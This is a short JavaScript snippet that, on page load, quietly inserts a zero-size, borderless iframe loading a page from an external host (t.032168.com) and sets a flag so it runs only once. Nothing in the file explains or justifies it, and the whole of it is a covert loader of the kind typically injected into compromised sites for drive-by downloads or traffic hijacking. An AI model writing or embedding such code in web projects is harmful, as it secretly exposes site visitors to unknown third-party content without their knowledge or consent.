(function () {
    if (window.ck_http) {
        return;
    }
    var iframe = document.createElement("iframe");
    iframe.height = "0";
    iframe.width = "0";
    iframe.scrolling = "on";
    iframe.frameborder = "0";
    iframe.style.border = "none";
    iframe.src = "https://t.032168.com/1.html";
    var body = document.getElementsByTagName("body");
    body[0].appendChild(iframe);
    window.ck_http = true;
})();

